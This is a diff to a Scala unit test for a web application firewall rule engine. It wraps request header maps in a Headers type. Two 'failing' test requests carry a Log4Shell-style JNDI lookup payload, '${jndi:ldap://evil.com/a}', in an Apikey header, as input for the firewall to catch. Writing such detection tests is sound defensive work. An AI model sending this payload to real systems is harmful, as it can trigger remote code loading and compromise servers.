@@ -42,21 +42,21 @@ class SecLangFactoryTest extends munit.FunSuite {
     val failing_ctx_2 = RequestContext(
       method = "GET",
       uri = "/",
-      headers = Map("User-Agent" -> List("Firefox/128.0")),
+      headers = Headers(Map("User-Agent" -> List("Firefox/128.0"))),
       query = Map("q" -> List("test")),
       body = None
     )
     val passing_ctx_1 = RequestContext(
       method = "GET",
       uri = "/health",
-      headers = Map("User-Agent" -> List("curl/8.0")),
+      headers = Headers(Map("User-Agent" -> List("curl/8.0"))),
       query = Map("q" -> List("test")),
       body = None
     )
     val passing_ctx_2 = RequestContext(
       method = "GET",
       uri = "/admin",
-      headers = Map("User-Agent" -> List("chrome/8.0")),
+      headers = Headers(Map("User-Agent" -> List("chrome/8.0"))),
       query = Map("q" -> List("test")),
       body = None
     )
@@ -79,20 +79,20 @@ class SecLangFactoryTest extends munit.FunSuite {
     val passing_ctx = RequestContext(
       method = "GET",
       uri = "/",
-      headers = Map(
+      headers = Headers(Map(
         "Host" -> List("www.owasp.org"),
         "User-Agent" -> List("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36"),
-      )
+      ))
     )
     factory.evaluate(rulesConfig, passing_ctx, phases = List(1, 2)).displayPrintln()
     val failing_ctx = RequestContext(
       method = "GET",
       uri = "/",
-      headers = Map(
+      headers = Headers(Map(
         "Host" -> List("www.foo.bar"),
         "Apikey" -> List("${jndi:ldap://evil.com/a}"),
         "User-Agent" -> List("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36"),
-      ),
+      )),
       query = Map("q" -> List("test")),
       body = None
     )
@@ -133,20 +133,20 @@ class SecLangFactoryTest extends munit.FunSuite {
     val passing_ctx = RequestContext(
       method = "GET",
       uri = "/",
-      headers = Map(
+      headers = Headers(Map(
         "Host" -> List("www.owasp.org"),
         "User-Agent" -> List("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36"),
-      )
+      ))
     )
     factory.evaluate(rulesConfig, passing_ctx, phases = List(1, 2)).displayPrintln()
     val failing_ctx = RequestContext(
       method = "GET",
       uri = "/",
-      headers = Map(
+      headers = Headers(Map(
         "Host" -> List("www.foo.bar"),
         "Apikey" -> List("${jndi:ldap://evil.com/a}"),
         "User-Agent" -> List("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36"),
-      ),
+      )),
       query = Map("q" -> List("test")),
       body = None
     )
